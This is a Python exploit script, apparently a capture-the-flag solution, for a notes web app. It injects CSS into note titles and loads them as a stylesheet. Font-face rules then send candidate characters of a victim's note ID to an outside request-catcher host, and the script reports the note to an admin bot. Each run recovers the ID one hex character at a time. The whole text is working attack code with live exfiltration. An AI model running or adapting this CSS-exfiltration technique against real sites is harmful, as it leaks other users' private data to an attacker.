import json
import time
import random
import string
import requests 

URL = "http://localhost:8000"

# Example:
#      f54dbf57-3317-4d6c-b903-bc56868fd728
EXFILTRATION = "https://player.requestcatcher.com/"
UID = ""

def register(user, password):
    r = requests.post(URL+'/api/auth/register', data={'email': user, 'password': password})


def login(user, password):
    r = requests.post(URL+'/api/auth/login', data={'email': user, 'password': password}, allow_redirects=False)
    return r.cookies["token"]


def first_payload(cookie):
    global UID
    payload = ""
    for letter in string.hexdigits[:16]:
        character = UID + letter
        payload += """
        @font-face {
          font-family: exfilFont"""+character+""";
          src: url(""" + EXFILTRATION +  """?id="""+character+""");
        }
        a[href^='/api/notes/""" + character + """'] {
          font-family: exfilFont"""+character+""";
        }
        """
    return json.loads(requests.post(URL+'/api/notes', cookies=cookie, data={'title':payload, 'content':' '}).text)["id"]

def second_payload(id, cookie):
    payload = f"""<link rel=stylesheet href="/static/api/notes/{id}"/>"""
    return json.loads(requests.post(URL+'/api/notes', cookies=cookie, data={'title':payload, 'content': ' '}).text)["id"]

def report(id, cookie):
    print(f"Reporting... {id}")
    r = requests.post(URL+'/report', cookies=cookie, data={'noteId': id})
    print(r.text)


USER = ''.join(random.choice(string.digits+string.ascii_letters) for _ in range(10))
PASSWORD = ''.join(random.choice(string.digits+string.ascii_letters) for _ in range(10))
print(f"USER {USER} -- PASSWORD {PASSWORD}")
register(USER, PASSWORD)
cookie = login(USER, PASSWORD)
while True:
    print(f"[X] UID: {UID}")
    id = first_payload({'token': cookie})
    id = second_payload(id, {'token': cookie})
    report(id, {'token': cookie})
    time.sleep(0.5)
    new_char = input("> ")
    UID += new_char
    if len(UID) in [8,13,18,23]:
        UID += '-'
